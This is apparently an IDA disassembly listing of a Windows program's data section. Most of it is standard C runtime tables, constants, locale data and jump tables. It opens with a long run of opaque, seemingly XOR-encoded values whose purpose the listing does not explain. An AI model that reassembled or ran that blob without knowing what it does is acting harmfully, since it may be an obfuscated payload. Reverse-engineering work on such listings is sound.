		dd 0C9h, 0B7h, 36h, 83h, 0A4h, 2 dup(0B0h), 21h, 77h, 36h
		dd 84h,	0A4h, 2	dup(0B0h), 9Fh,	77h, 36h, 85h, 0A4h, 2 dup(0B0h)
		dd 0A3h, 77h, 36h, 86h,	0A4h, 2	dup(0B0h), 0ACh, 77h, 36h
		dd 87h,	0A4h, 0B0h, 0F0h, 42h, 0B7h, 76h, 0C8h,	0E4h, 2	dup(0F0h)
		dd 0DEh, 0B7h, 76h, 0C9h, 0E4h,	2 dup(0F0h), 0D6h, 0B7h
		dd 76h,	0CAh, 0E4h, 2 dup(0F0h), 0DBh, 0B7h, 76h, 0CBh
		dd 0E4h, 2 dup(0F0h), 0D3h, 0B7h, 76h, 0Ch, 24h, 2 dup(30h)
		dd 0A6h, 0F7h, 0B6h, 0Dh, 24h, 2 dup(30h), 7Dh,	0F7h, 0B6h
		dd 0Eh,	24h, 2 dup(30h), 0ABh, 0F7h, 0B6h, 0Fh,	24h, 2 dup(30h)
		dd 73h,	0F7h, 0B6h, 10h, 24h, 2	dup(30h), 32h, 0B7h, 76h
		dd 0D1h, 0E4h, 2 dup(0F0h), 47h, 0B7h, 76h, 0D2h, 0E4h
		dd 2 dup(0F0h),	0C5h, 0B7h, 76h, 0D3h, 0E4h, 2 dup(0F0h)
		dd 0CEh, 0B7h, 76h, 0D4h, 0E4h,	2 dup(0F0h), 62h, 0B7h
		dd 76h,	0D5h, 0A4h, 2 dup(0B0h), 23h, 77h, 36h,	96h, 0A4h
		dd 2 dup(0B0h),	1Fh, 77h, 36h, 97h, 0A4h, 2 dup(0B0h)
		dd 71h,	77h, 36h, 98h, 0A4h, 2 dup(0B0h), 1Eh, 77h, 36h
		dd 99h,	0A4h, 2	dup(0B0h), 7Ah,	0B7h, 76h, 0DAh, 0E4h
		dd 2 dup(0F0h),	34h, 0B7h, 76h,	0DBh, 0E4h, 2 dup(0F0h)
		dd 0E5h, 0B7h, 76h, 0DCh, 0E4h,	2 dup(0F0h), 0E7h, 0B7h
		dd 76h,	0DDh, 0E4h, 2 dup(0F0h), 67h, 0B7h, 76h, 0DEh
		dd 0E4h, 2 dup(30h), 9Dh, 0F7h,	0B6h, 1Fh, 24h,	2 dup(30h)
		dd 96h,	0F7h, 0B6h, 20h, 24h, 2	dup(30h), 0FCh,	0F7h, 0B6h
		dd 21h,	24h, 2 dup(30h), 22h, 0F7h, 0B6h, 22h, 24h, 2 dup(30h)
		dd 89h,	0F7h, 76h, 0E3h, 0E4h, 2 dup(0F0h), 0C0h, 0B7h
		dd 76h,	2 dup(0E4h), 2 dup(0F0h), 0B3h,	0B7h, 76h, 0E5h
		dd 0E4h, 2 dup(0F0h), 0E8h, 0B7h, 76h, 0E6h, 0E4h, 2 dup(0F0h)
		dd 0EFh, 0B7h, 76h, 0E7h, 0E4h,	0F0h, 0B0h, 0Bh, 77h, 36h
		dd 0A8h, 0A4h, 2 dup(0B0h), 7Fh, 77h, 36h, 0A9h, 0A4h
		dd 2 dup(0B0h),	88h, 77h, 36h, 0AAh, 0A4h, 2 dup(0B0h)
		dd 12h,	77h, 36h, 0ABh,	0A4h, 2	dup(0B0h), 0AAh, 77h, 36h
		dd 0ECh, 0E4h, 2 dup(0F0h), 0EDh, 0B7h,	76h, 0EDh, 0E4h
		dd 2 dup(0F0h),	0D7h, 0B7h, 76h, 0EEh, 0E4h, 2 dup(0F0h)
		dd 0C7h, 0B7h, 76h, 0EFh, 0E4h,	2 dup(0F0h), 0EEh, 0B7h
		dd 76h,	0F0h, 0E4h, 2 dup(0F0h), 0FBh, 0F7h, 0B6h, 31h
		dd 25h,	2 dup(30h), 9Ch, 0F7h, 0B6h, 32h, 25h, 2 dup(30h)
		dd 97h,	0F7h, 0B6h, 33h, 25h, 2	dup(30h), 26h, 64h, 0F1h
		dd 0BAh, 0B6h, 15h, 2Fh, 2 dup(30h), 64h, 0F1h,	7Ah, 76h
		dd 0CDh, 0EFh, 2 dup(0F0h), 24h, 0B1h, 7Ah, 76h, 0C9h
		dd 0EFh, 2 dup(0F0h), 24h, 0B1h, 7Ah, 76h, 0D1h, 0EFh
		dd 2 dup(0F0h),	7Ch, 76h, 65h, 3 dup(0F0h), 7Ch, 31h, 0FDh
		dd 76h,	71h, 0C0h, 3Dh,	98h, 3 dup(0B1h), 0F1h,	3Ah, 36h
		dd 61h,	0AEh, 2	dup(0B0h), 0E4h, 0A7h, 69h, 0B2h, 3 dup(0B1h)
		dd 3Eh,	46h, 74h, 0A4h,	2 dup(0B0h), 3Ah, 46h, 5Dh, 0AEh
		dd 0B0h, 0F0h, 7Bh, 5, 24h, 7Ch, 7Eh, 9Dh, 0EEh, 2 dup(0F0h)
		dd 2Bh,	2, 66h,	0FCh, 7Ch, 0C1h, 3Bh, 7Ah, 86h,	0D1h, 0EFh
		dd 2 dup(0F0h),	0DCh, 0FDh, 31h, 0F0h, 76h, 9Dh, 0EEh
		dd 2 dup(0F0h),	0B4h, 29h, 72h,	0A6h, 0Dh, 0B4h, 0EEh
		dd 11h,	2Fh, 2 dup(30h), 31h, 40h, 0BDh, 0C0h, 3 dup(31h)
		dd 0BCh, 0B6h, 0Dh, 2Fh, 2 dup(30h), 0F2h, 11h,	37h, 34h
		dd 0B6h, 11h, 2Fh, 30h,	0F0h, 7Ah, 76h,	0CDh, 0EFh, 2 dup(0F0h)
		dd 74h,	76h, 0D5h, 0EFh, 2 dup(0F0h), 0F7h, 74h, 0AEh
		dd 0D5h, 0EFh, 2 dup(0F0h), 0F9h, 6Dh, 5Bh, 74h, 9Eh, 0D5h
		dd 0EFh, 2 dup(0F0h), 0F9h, 7Ch, 7Eh, 95h, 0AFh, 2 dup(0B0h)
		dd 3Ch,	36h, 8Dh, 0AFh,	2 dup(0B0h), 84h, 99h, 3Ah, 36h
		dd 91h,	0AFh, 2	dup(0B0h), 3Ch,	3Eh, 95h, 0AFh,	2 dup(0B0h)
		dd 69h,	0B2h, 3	dup(0B1h), 84h,	91h, 1,	7Ch, 76h, 0CDh
		dd 0EFh, 2 dup(0F0h), 4Bh, 7Ch,	0BBh, 8Ah, 0E8h, 0EAh
		dd 7Ah,	86h, 0CDh, 0EFh, 2 dup(0F0h), 7Ch, 76h,	0D1h, 0EFh
		dd 2 dup(0F0h),	16h, 0F0h, 2 dup(0F1h),	71h, 6Ah, 0F8h
		dd 39h,	3Eh, 31h, 3 dup(30h), 71h, 0BAh, 0B6h, 11h, 2Fh
		dd 2 dup(30h), 0BCh, 0B6h, 9, 2Fh, 2 dup(30h), 0BCh, 0C6h
		dd 11h,	2Fh, 2 dup(30h), 0B9h, 45h, 34h, 30h, 0B6h, 9
		dd 2Fh,	30h, 0F0h, 37h,	0F0h, 7Eh, 0A1h, 0EEh, 2 dup(0F0h)
		dd 0
		dd 76h,	13h, 3 dup(0F0h), 59h, 0F1h, 71h, 2 dup(0F1h)
		dd 7Ch,	36h, 99h, 41h, 7Ch, 36h, 0DDh, 41h, 0F0h, 86h
		dd 0ADh, 0EEh, 0F0h, 0B0h, 1Bh,	0F1h, 19h, 0B1h, 0C1h
		dd 2 dup(0B1h),	3Ch, 36h, 25h, 3 dup(0B0h), 3Ch, 0F1h
		dd 0D1h, 1, 1Bh, 0B1h, 0B0h, 6,	7Dh, 3Ah, 0F6h,	9Dh, 3Ah
		dd 0Eh,	9Dh, 19h, 0B1h,	31h, 2 dup(0F1h), 7Ch, 36h, 99h
		dd 41h,	44h, 0F0h, 86h,	0ADh, 0EEh, 2 dup(0F0h), 7Ch, 76h
		dd 65h,	3 dup(0F0h), 7Ch, 31h, 11h, 76h, 0B1h, 6Dh, 54h
		dd 31h,	7Ah, 76h, 0A1h,	0EEh, 0F0h, 30h, 64h, 0F1h, 0BCh
		dd 86h,	1Dh, 34h, 1, 0BBh, 43h,	0BCh, 7Eh, 1Dh,	0B9h, 45h
		dd 32h,	0BEh, 81h, 32h,	0BCh, 0BEh, 0A5h, 3 dup(30h), 64h
		dd 82h,	39h, 0BEh, 79h,	32h, 0BCh, 8Eh,	65h, 3 dup(0F0h)
		dd 0
		dd 0A0h, 3Ch, 0F9h, 24h, 0C2h, 7Ch, 3Eh, 0DDh, 0
		dd 0A7h, 0FDh, 0F2h, 1Ch, 0BBh,	7Ch, 46h, 0DDh,	79h, 0FDh
		dd 0F3h, 7Eh, 41h, 0F2h, 7Ch, 7Eh, 65h,	3 dup(0B0h), 0E4h
		dd 0C2h, 3Ch, 0FEh, 9Dh, 0C0h, 67h, 0BDh, 0B2h,	0DCh, 7Bh
		dd 3Ch,	6, 9Dh,	39h, 0BDh, 0B3h, 0F1h, 0B0h, 3Eh, 61h
		dd 0AEh, 2 dup(0B0h), 26h, 57h,	3Ch, 36h, 25h, 3 dup(0F0h)
		dd 7Ch,	31h, 15h, 7Ah, 76h, 0B1h, 0EEh,	2 dup(0F0h), 7Eh
		dd 36h,	0DDh, 7Ch, 46h,	0CDh, 43h, 0F0h, 66h, 0F9h, 0F0h
		dd 1, 50h, 4Fh,	4Ch, 7Ch, 0D6h,	4Eh, 0B3h, 0F5h, 31h, 0BEh
		dd 71h,	31h, 2Ch, 0FFh,	2Fh, 0A6h, 73h,	79h, 0
		dd 9Fh,	9Eh, 9Ch, 13h, 80h, 0F1h, 9Ch, 0A8h, 8,	0F8h, 0A7h
		dd 16h,	1Dh, 14h, 0A1h,	25h, 7Ah, 0F8h,	9Eh, 0A1h, 31h
		dd 0B1h, 0EEh, 0F1h, 0C7h, 0F1h, 45h, 0DDh, 32h, 45h, 0BCh
		dd 3Ah,	63h, 61h, 0A9h,	0C0h, 0E7h, 0F1h, 33h, 56h, 52h
		dd 0B3h, 42h, 0ECh, 3Fh, 34h, 0E0h, 0E3h, 49h, 0E5h, 49h
		dd 0E8h, 4Bh, 0B1h, 0FDh, 2, 0
		dd 0AFh, 0F3h, 17h, 89h, 0A8h, 9Dh, 0ACh, 0Bh, 93h, 0F2h
		dd 0A5h, 0F3h, 95h, 7Ah, 0F6h, 0F3h, 0B1h, 96h,	1Ch, 2
		dd 69h,	0F2h, 0AFh, 9Dh, 2 dup(2Bh), 0A2h, 16h,	61h, 5Dh
		dd 68h,	3Ah, 0C5h, 0DEh, 67h, 0EEh, 0C8h, 0DDh,	0F1h, 5Ch
		dd 0F1h, 0D7h, 49h, 0E8h, 39h, 5Fh, 0B1h, 0EBh,	5Fh, 0DEh
		dd 0C0h, 5Dh, 0E8h, 3Fh, 56h, 66h, 47h,	0B3h, 0E0h, 5Dh
		dd 2Bh,	0F8h, 8Bh, 80h,	31h, 22h, 2Ah, 0F3h, 0A2h, 25h
		dd 7Fh,	97h, 17h, 89h, 82h, 27h, 2Eh, 2	dup(31h), 72h
		dd 7Dh,	9Eh, 0A1h, 31h,	74h, 20h, 31h, 17h, 2 dup(0A6h)
		dd 97h,	0FCh, 0D7h, 0EDh, 0C7h,	3Ah, 3Fh, 0BAh,	0CEh, 61h
		dd 0D3h, 0E3h, 0C9h, 0E5h, 0E8h, 52h, 0ECh, 3Fh, 0E6h
		dd 68h,	0EAh, 0B1h, 0C7h, 0EDh,	0C8h, 0DFh, 0D6h, 67h
		dd 2 dup(34h), 0C5h, 0BFh, 5Ch,	0C8h, 0ABh, 21h, 2 dup(0B1h)
		dd 0F3h, 0D2h, 0E4h, 18h, 3 dup(0B1h), 5Fh, 3 dup(0B1h)
		dd 0D5h, 3 dup(0B1h), 0ABh, 73h, 0B2h, 0B1h, 79h, 8Dh
		dd 0B2h, 5 dup(0B1h), 2	dup(0F2h), 6 dup(0F1h),	2Ch, 43h
		dd 0F2h, 2 dup(0F1h), 0D1h, 0F3h, 0F1h,	26h, 6,	2 dup(0F1h)
		dd 0C9h, 0F0h, 0E0h, 7Ah, 0D8h,	76h, 2Dh, 0B7h,	11h, 5Bh
		dd 0DDh, 0F0h, 65h, 81h, 41h
dword_42FEEC	dd 176E0h		; DATA XREF: sub_409DF0+8F5r
					; sub_409DF0+A29r
		dd 9875h, 9873h, 2 dup(0)
dword_42FF00	dd 676F6Ch, 3 dup(0)	; DATA XREF: _log+D2o _log+13Eo
dbl_42FF10	dq 0.5			; DATA XREF: _test_whether_TOS_is_int+Er
dword_42FF18	dd 776F70h, 0		; DATA XREF: _pow+105o	_pow+122o
dword_42FF20	dd 2			; DATA XREF: __NMSG_WRITE+4Cr
					; __FF_MSGBANNER+19r
off_42FF24	dd offset __fptrap	; DATA XREF: __cfltcvt_init+5w
					; __initp_misc_cfltcvt_tab:loc_4172A4o
off_42FF28	dd offset __fptrap	; DATA XREF: __cfltcvt_init+Aw
off_42FF2C	dd offset __fptrap	; DATA XREF: __cfltcvt_init+14w
off_42FF30	dd offset __fptrap	; DATA XREF: __cfltcvt_init+1Ew
off_42FF34	dd offset __fptrap	; DATA XREF: __cfltcvt_init+28w
off_42FF38	dd offset __fptrap	; DATA XREF: __cfltcvt_init+32w
off_42FF3C	dd offset __fptrap	; DATA XREF: __cfltcvt_init+37w
off_42FF40	dd offset __fptrap	; DATA XREF: __cfltcvt_init+41w
off_42FF44	dd offset __fptrap	; DATA XREF: __cfltcvt_init+4Bw
off_42FF48	dd offset __fptrap	; DATA XREF: __cfltcvt_init+55w
		align 10h
dword_42FF50	dd 1			; DATA XREF: __get_errno_from_oserr:loc_41735Br
dword_42FF54	dd 16h			; DATA XREF: __get_errno_from_oserr:loc_417377r
		dd 2 dup(2), 3,	2, 4, 18h, 5, 0Dh, 6, 9, 7, 0Ch, 8, 0Ch
		dd 9, 0Ch, 0Ah,	7, 0Bh,	8, 0Ch,	16h, 0Dh, 16h, 0Fh, 2
		dd 10h,	0Dh, 11h, 2 dup(12h), 2, 21h, 0Dh, 35h,	2, 41h
		dd 0Dh,	43h, 2,	50h, 11h, 52h, 0Dh, 53h, 0Dh, 57h, 16h
		dd 59h,	0Bh, 6Ch, 0Dh, 6Dh, 20h, 70h, 1Ch, 72h,	9, 6, 16h
		dd 80h,	0Ah, 81h, 0Ah, 82h, 9, 83h, 16h, 84h, 0Dh, 91h
		dd 29h,	9Eh, 0Dh, 0A1h,	2, 0A4h, 0Bh, 0A7h, 0Dh, 0B7h
		dd 11h,	0CEh, 2, 0D7h, 0Bh, 718h, 0Ch
dword_4300B8	dd 0Ch,	8		; DATA XREF: __errno+9o
; LPCRITICAL_SECTION lpCriticalSection
lpCriticalSection dd 0			; DATA XREF: __mtinitlocks:loc_41741Cw
					; __mtterm-3D43o ...
dword_4300C4	dd 1			; DATA XREF: __mtinitlocks:loc_4173E8r
		dd 0
		dd 1, 3	dup(0)
		dd 1, 0
		dd 1, 3	dup(0)
		dd 1, 0
		dd 1, 0
		dd 1, 3	dup(0)
		dd 1, 3	dup(0)
		dd 1, 0
		dd 1, 0
		dd 1, 3	dup(0)
		dd 1, 0
		dd 1, 0
		dd 1, 22h dup(0)
dword_4301E0	dd 10h,	3 dup(0)	; DATA XREF: __mtterm-3D21o
					; __mtterm-3D01o
tbyte_4301F0	dt 1.1897314953572317651e4932 ;	DATA XREF: _pow+20Dr
					; .text:00418ACCr ...
tbyte_4301FA	dt -1.1897314953572317651e4932 ; DATA XREF: _log+126r
					; .text:00418AFDr
		dd 0B9D7A7DCh, 0B1716685h
		db 0Dh,	40h
tbyte_43020E	dt 32767.5		; DATA XREF: __ffexpm1+4r
		dd 0C4336F7h, 95F61998h
		db 0FDh, 3Fh
dbl_430222	dq 0.5			; DATA XREF: _isintTOS+Er
word_43022A	dw 6503h		; DATA XREF: _exp:__exp_defaulto
					; _exp:__CIexp_defaulto
		dd 7078h, 0
		dd 1000000h, 8A610014h,	925D0041h, 92620041h, 8BA10041h
		dd 41h,	0
tbyte_430250	dt -1.7845972430358476476e4932 ; DATA XREF: _log+102r
					; _pow+252r ...
		dw 0C235h
		dd 0DAA22168h, 3FFFC90Fh
dbl_430264	dq 1.0			; DATA XREF: .text:00419286r
dword_43026C	dd 2 dup(8080408h), 2 dup(80C0400h), 0 ; DATA XREF: __trandisp1+28o
					; __trandisp2+28o
off_430280	dd offset __exit	; DATA XREF: __amsg_exit+12r
					; __init_pointers+47w
		align 8
dword_430288	dd 2			; DATA XREF: __NMSG_WRITE:loc_41A5B2r
; char *off_43028C
off_43028C	dd offset aR6002FloatingP ; DATA XREF: __NMSG_WRITE+13Dr
					; "R6002\r\n- floating point support not l"...
		dd 8, 429974h, 9, 429948h, 0Ah,	4298B0h, 10h, 429884h
		dd 11h,	429854h, 12h, 429830h, 13h, 429804h, 18h, 4297CCh
		dd 19h,	4297A4h, 1Ah, 42976Ch, 1Bh, 429734h, 1Ch, 42970Ch
		dd 1Eh,	4296ECh, 1Fh, 429688h, 20h, 429650h, 21h, 429558h
		dd 22h,	4294B8h, 78h, 4294A4h, 79h, 429494h, 7Ah, 429484h
		dd 0FCh, 429480h, 0FFh,	429470h
dword_430340	dd 3			; DATA XREF: __XcptFilter+92r
					; __XcptFilter+B1r ...
dword_430344	dd 7			; DATA XREF: __XcptFilter+98r
					; __XcptFilter+B7r ...
		dd 78h
dword_43034C	dd 0Ah			; DATA XREF: __XcptFilter+1Ar
					; _siglookup+8r
		dd 0FFFFFFFFh, 0A80h, 0Eh dup(0)
dword_430390	dd 0FFFFFFFFh		; DATA XREF: __encode_pointer+18r
					; __decode_pointer+18r	...
; DWORD	dwTlsIndex
dwTlsIndex	dd 0FFFFFFFFh		; DATA XREF: __encode_pointer+6r
					; __encode_pointer+23r	...
		align 10h
dword_4303A0	dd 17h dup(0)		; DATA XREF: __initptd+6Fo
					; _freefls(x)+A8o ...
		dd 10100000h, 6	dup(10101010h),	0
		dd 20200000h, 6	dup(20202020h),	31h dup(0)
		dd 62610000h, 66656463h, 6A696867h, 6E6D6C6Bh, 7271706Fh
		dd 76757473h, 7A797877h, 0
		db    0
		align 2
aAbcdefghijklmn	db 'ABCDEFGHIJKLMNOPQRSTUVWXYZ',0
		align 4
		dd 21h dup(0)
byte_4305C0	db 0			; DATA XREF: __setmbcp+102w
		align 4
		dd 0Fh dup(0)
		dd 10100000h, 6	dup(10101010h),	0
		dd 20200000h, 6	dup(20202020h),	23h dup(0)
byte_4306C8	db 0			; DATA XREF: __setmbcp+11Ew
		align 4
		dd 0Fh dup(0)
		dd 63626100h, 67666564h, 6B6A6968h, 6F6E6D6Ch, 73727170h
		dd 77767574h, 7A7978h, 0
		db    0
aAbcdefghijkl_0	db 'ABCDEFGHIJKLMNOPQRSTUVWXYZ',0
		dd 21h dup(0)
; volatile LONG	*lpAddend
lpAddend	dd offset dword_4303A0	; DATA XREF: _LocaleUpdate::_LocaleUpdate(localeinfo_struct *)+45r
					; ___updatetmbcinfo+4Cr ...
byte_4307CC	db 1			; DATA XREF: __setmbcp_nolock+113r
		db 2, 4, 8
dword_4307D0	dd 3A4h			; DATA XREF: __setmbcp_nolock:loc_41BA31r
aVyv		db '`‚y‚!',0            ; DATA XREF: __setmbcp_nolock+15Bo
		align 10h
aJ		db '¦ß',0               ; DATA XREF: __setmbcp_nolock+F6o
		align 8
aBe		db '¡¥',0
		align 10h
		dd 0FCE09F81h, 0
		dd 0FC807E40h, 0
		dd 3A8h, 0A3DAA3C1h, 20h, 5 dup(0)
		dd 0FE81h, 0
		dd 0FE40h, 0
		dd 3B5h, 0A3DAA3C1h, 20h, 5 dup(0)
		dd 0FE81h, 0
		dd 0FE41h, 0
		dd 3B6h, 0A2E4A2CFh, 0A2E5001Ah, 5BA2E8h, 4 dup(0)
		dd 0FE81h, 0
		dd 0FEA17E40h, 0
		dd 551h, 0DA5EDA51h, 0DA5F0020h, 32DA6Ah, 4 dup(0)
		dd 0DED8D381h, 0F9E0h, 0FE817E31h, 0
		dd offset dword_429FD8+4
dword_4308C4	dd 0FFFFFFFEh		; DATA XREF: _LocaleUpdate::_LocaleUpdate(localeinfo_struct *)+30r
					; _LocaleUpdate::_LocaleUpdate(localeinfo_struct *)+50r ...
dword_4308C8	dd 43h,	0		; DATA XREF: ___freetlocinfo:loc_41BE94o
					; ___addlocaleref:loc_41BF2Bo ...
dword_4308D0	dd 1, 15h dup(0)	; DATA XREF: _freefls(x)+E8o
					; __updatetlocinfoEx_nolock+28o ...
		dd offset dword_4308C8
		dd 3 dup(0)
		dd offset dword_4308C8
		dd 3 dup(0)
		dd offset dword_4308C8
		dd 3 dup(0)
		dd offset dword_4308C8
		dd 3 dup(0)
		dd offset dword_4308C8
		dd 3 dup(0)
		dd 2 dup(1), 3 dup(0)
		dd offset off_430C20
		dd 2 dup(0)
off_430998	dd offset asc_429DD8	; DATA XREF: _isdigit+11r
					; "	    (((((		   H"
		dd offset dword_42A1E0+80h
		dd offset dword_42A1E0+200h
		dd offset off_430B60
off_4309A8	dd offset dword_4308D0	; DATA XREF: _LocaleUpdate::_LocaleUpdate(localeinfo_struct *)+28r
					; __initptd+ACr ...
		dd 1
off_4309B0	dd offset dword_4308D0	; DATA XREF: _strtol+19o
		dd offset dword_4303A0
		align 10h
___security_cookie dd 0BB40E64Eh	; DATA XREF: __cftoe_l+8r __cftof_l+8r ...
dword_4309C4	dd 44BF19B1h		; DATA XREF: ___security_init_cookie+2Bw
					; ___security_init_cookie+8Bw ...
		align 10h
byte_4309D0	db 0			; DATA XREF: unknown_libname_1+26r
		db 1, 2	dup(0)
		dd 7000004h, 0A0000h, 0D00h
flt_4309E0	dd 0.9375		; DATA XREF: unknown_libname_1+6Cr
					; unknown_libname_1+74r
flt_4309E4	dd 1.0625		; DATA XREF: unknown_libname_1:loc_41D6F3r
					; unknown_libname_1+8Br
flt_4309E8	dd 9.223372e18		; DATA XREF: unknown_libname_1+F6r
byte_4309EC	db 0			; DATA XREF: unknown_libname_15+1Dr
					; unknown_libname_17+1Dr
		db 1, 2	dup(0)
		dd 7000004h, 0A0000h, 0D00h, 0
		dd 3FEE0000h
dbl_430A04	dq 1.844674407370955e19	; DATA XREF: unknown_libname_16+68r
					; unknown_libname_16+72r ...
dbl_430A0C	dq 5.421010862427522e-20 ; DATA	XREF: unknown_libname_15+1CDr
					; unknown_libname_17+1CDr
		dd 0
		dd 3FF00000h
dbl_430A1C	dq 0.5			; DATA XREF: unknown_libname_15+161r
					; unknown_libname_17+161r
tbyte_430A24	dt 1.1897133414953030964e4932 ;	DATA XREF: unknown_libname_15+17Cr
					; unknown_libname_17+17Cr
		dd offset sub_41D794, offset word_41D79A, offset sub_41D79F ; jump table for switch statement
		dd offset byte_41D7A5, offset sub_41D7AA, offset sub_41D7B0
		dd offset sub_41D7B6, offset sub_41D7BC, offset	sub_41D7C2
		dd offset word_41D7DE, offset sub_41D7E3, offset byte_41D7F9
		dd offset sub_41D7FE, offset sub_41D81A, offset	sub_41D82A
		dd offset sub_41D83E, offset sub_41D84E, offset	word_41D86E
		dd offset sub_41D873, offset byte_41D88D, offset sub_41D892
		dd offset sub_41D8B2, offset sub_41D8C6, offset	sub_41D8DE
		dd offset sub_41D8F2, offset word_41D912, offset sub_41D917
		dd offset byte_41D931, offset sub_41D936, offset sub_41D956
		dd offset sub_41D96A, offset sub_41D982, offset	sub_41D996
		dd offset word_41D9B6, offset sub_41D9BB, offset byte_41D9D5
		dd offset sub_41D9DA, offset sub_41D9FA, offset	sub_41DA0E
		dd offset sub_41DA26, offset sub_41DA3A, offset	word_41DA5A
		dd offset sub_41DA5F, offset byte_41DA79, offset sub_41DA7E
		dd offset sub_41DA9E, offset sub_41DAB2, offset	sub_41DACA
		dd offset sub_41DADE, offset word_41DAFE, offset sub_41DB03
		dd offset byte_41DB1D, offset sub_41DB22, offset sub_41DB42
		dd offset sub_41DB56, offset sub_41DB6E, offset	sub_41DB82
		dd offset word_41DBA2, offset sub_41DBA7, offset byte_41DBC1
		dd offset sub_41DBC6, offset sub_41DBE6, offset	sub_41DBFA
		dd offset sub_41DC12
		align 10h
dbl_430B30	dq 1.797693134862316e308 ; DATA	XREF: __powhlp+40r
					; __powhlp+93r	...
dbl_430B38	dq -2.696539702293474e308 ; DATA XREF: __powhlp:loc_41A174r
dbl_430B40	dq 1.797693134862316e308 ; DATA	XREF: __handle_exc+8Br
					; __handle_exc+A6r ...
		dd 0
		dd 100000h
dbl_430B50	db 0, 0, 0, 0, 0, 0, 0,	80h ; DATA XREF: __powhlp+126r
		dd offset asc_429DD8	; "	    (((((		   H"
		dd offset dword_429FD8+2
off_430B60	dd offset aSun		; DATA XREF: ___freetlocinfo+DCo
					; .data:004309A4o ...
					; "Sun"
		dd offset aMon		; "Mon"
		dd offset aTue		; "Tue"
		dd offset aWed		; "Wed"
		dd offset aThu		; "Thu"
		dd offset aFri		; "Fri"
		dd offset aSat		; "Sat"
		dd offset aSunday	; "Sunday"
		dd offset aMonday	; "Monday"
		dd offset aTuesday	; "Tuesday"
		dd offset aWednesday	; "Wednesday"
		dd offset aThursday	; "Thursday"
		dd offset aFriday	; "Friday"
		dd offset aSaturday	; "Saturday"
		dd offset aJan		; "Jan"
		dd offset aFeb		; "Feb"
		dd offset aMar		; "Mar"
		dd offset aApr		; "Apr"
		dd offset aMay		; "May"
		dd offset aJun		; "Jun"
		dd offset aJul		; "Jul"
		dd offset aAug		; "Aug"
		dd offset aSep		; "Sep"
		dd offset aOct		; "Oct"
		dd offset aNov		; "Nov"
		dd offset aDec		; "Dec"
		dd offset aJanuary	; "January"
		dd offset aFebruary	; "February"
		dd offset aMarch	; "March"
		dd offset aApril	; "April"
		dd offset aMay		; "May"
		dd offset aJune		; "June"
		dd offset aJuly		; "July"
		dd offset aAugust	; "August"
		dd offset aSeptember	; "September"
		dd offset aOctober	; "October"
		dd offset aNovember	; "November"
		dd offset aDecember	; "December"
		dd offset aAm		; "AM"
		dd offset aPm		; "PM"
		dd offset aMmDdYy	; "MM/dd/yy"
		dd offset aDdddMmmmDdYyyy ; "dddd, MMMM	dd, yyyy"
		dd offset dword_42A1E0+300h
		dd 409h, 1, 0
		dd offset off_430B60
dword_430C1C	dd 2Eh			; DATA XREF: .data:off_430C20o
off_430C20	dd offset dword_430C1C	; DATA XREF: ___freetlocinfo+17o
					; ___free_lconv_num+Fr	...
off_430C24	dd offset dword_44EBAC	; DATA XREF: ___free_lconv_num+21r
off_430C28	dd offset dword_44EBAC	; DATA XREF: ___free_lconv_num+33r
off_430C2C	dd offset dword_44EBAC	; DATA XREF: ___free_lconv_mon+10r
off_430C30	dd offset dword_44EBAC	; DATA XREF: ___free_lconv_mon+22r
off_430C34	dd offset dword_44EBAC	; DATA XREF: ___free_lconv_mon+34r
off_430C38	dd offset dword_44EBAC	; DATA XREF: ___free_lconv_mon+46r
off_430C3C	dd offset dword_44EBAC	; DATA XREF: ___free_lconv_mon+58r
off_430C40	dd offset dword_44EBAC	; DATA XREF: ___free_lconv_mon+6Ar
off_430C44	dd offset dword_44EBAC	; DATA XREF: ___free_lconv_mon+7Cr
		dd 2 dup(7F7F7F7Fh), 430C20h, 1, 2Eh, 1
dword_430C60	dd 400h			; DATA XREF: sub_41F8B8:loc_41FC5Er
					; sub_41F8B8+44Fr
dword_430C64	dd 0FFFFFC01h		; DATA XREF: sub_41F8B8:loc_41FA29r
dword_430C68	dd 35h			; DATA XREF: sub_41F8B8+7Ar
					; sub_41F8B8+178r ...
dword_430C6C	dd 0Bh			; DATA XREF: sub_41F8B8:loc_41FBC5r
					; sub_41F8B8+3ACr ...
dword_430C70	dd 40h			; DATA XREF: sub_41F8B8+51Br
dword_430C74	dd 3FFh			; DATA XREF: sub_41F8B8+454r
					; sub_41F8B8:loc_41FD1Dr
dword_430C78	dd 80h			; DATA XREF: sub_41FDFC:loc_4201A2r
					; sub_41FDFC+44Fr
dword_430C7C	dd 0FFFFFF81h		; DATA XREF: sub_41FDFC:loc_41FF6Dr
dword_430C80	dd 18h			; DATA XREF: sub_41FDFC+7Ar
					; sub_41FDFC+178r ...
dword_430C84	dd 8			; DATA XREF: sub_41FDFC:loc_420109r
					; sub_41FDFC+3ACr ...
dword_430C88	dd 20h			; DATA XREF: sub_41FDFC+51Br
dword_430C8C	dd 7Fh			; DATA XREF: sub_41FDFC+454r
					; sub_41FDFC:loc_420261r
dword_430C90	dd 19930520h, 3	dup(0)	; DATA XREF: .text:00421BB2o
					; __NLG_Notify+2o
dword_430CA0	dd 2694h		; DATA XREF: __cintrindisp2+12r
					; __cintrindisp1+11r ...
		align 8
		dd 14h,	429C58h, 1Dh, 429C5Ch, 1Ah, 429C4Ch, 1Bh, 429C50h
		dd 1Fh,	42A6A4h, 13h, 42A69Ch, 21h, 42A694h, 0Eh, 429C44h
		dd 0Dh,	429C3Ch, 0Fh, 429C2Ch, 10h, 42A68Ch, 5,	42A684h
		dd 1Eh,	429C10h, 12h, 429C0Ch, 20h, 429C08h, 0Ch, 429C24h
		dd 0Bh,	429C1Ch, 15h, 42A67Ch, 1Ch, 429C14h, 19h, 42A674h
		dd 11h,	42A66Ch, 18h, 42A664h, 16h, 42A65Ch, 17h, 42A654h
		dd 22h,	42A650h, 23h, 42A64Ch, 24h, 42A648h, 25h, 42A640h
		dd 26h,	42A634h
tbyte_430D90	dt 2.3562723457267347066e313 ; DATA XREF: __set_statfp+Fr
					; __set_statfp+21r
		align 4
tbyte_430D9C	dt 1.9149954921904370718e-1233 ; DATA XREF: __set_statfp+33r
		align 4
dword_430DA8	dd 1			; DATA XREF: ___set_fpsr_sse2+1Cr
					; ___set_fpsr_sse2+4Cw
byte_430DAC	db 3			; DATA XREF: _abort+15r
					; _abort:loc_422238r
		align 10h
		dd 7080h, 1, 0FFFFF1F0h, 0
dword_430DC0	dd 545350h, 0Fh	dup(0)	; DATA XREF: .data:00430E40o
dword_430E00	dd 544450h, 0Fh	dup(0)	; DATA XREF: .data:00430E44o
		dd offset dword_430DC0
		dd offset dword_430E00
		dd 0FFFFFFFFh, 2 dup(0)
